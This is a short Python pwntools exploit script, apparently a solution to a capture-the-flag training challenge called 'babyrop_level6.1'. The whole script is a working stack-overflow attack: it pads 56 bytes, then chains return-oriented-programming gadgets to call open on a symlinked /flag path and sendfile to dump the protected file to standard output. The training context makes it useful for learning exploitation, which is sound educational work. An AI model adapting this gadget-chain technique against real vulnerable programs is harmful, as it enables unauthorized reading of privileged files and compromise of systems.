from pwn import *
context.binary = '/challenge/babyrop_level6.1'
context.terminal = ["tmux", "splitw", "-h"]
#p = gdb.debug("/challenge/babyrop_level6.0")
offset = 56
p = process()
payload = b'A'*offset
#Gadgets needed for open syscall
payload += p64(0x0000000000401bf5) #pop rdi
payload += p64(0x00402004) #address contain call that is symlink to /flag 
payload += p64(0x0000000000401bed) # pop rsi
payload += p64(0)
payload += p64(0x0000000000401bfd) #pop rdx
payload += p64(0)
payload += p64(0x00401100) # open function

#Gadgets needed for sendfile syscall
payload += p64(0x0000000000401bf5) #pop rdi
payload += p64(0x1)
payload += p64(0x0000000000401bed) # pop rsi
payload += p64(0x3)
payload += p64(0x0000000000401bfd) #pop rdx
payload += p64(0)
payload += p64(0x0000000000401be5) # pop rcx
payload += p64(0x100)
payload += p64(0x004010e0)
p.send(payload)
p.interactive()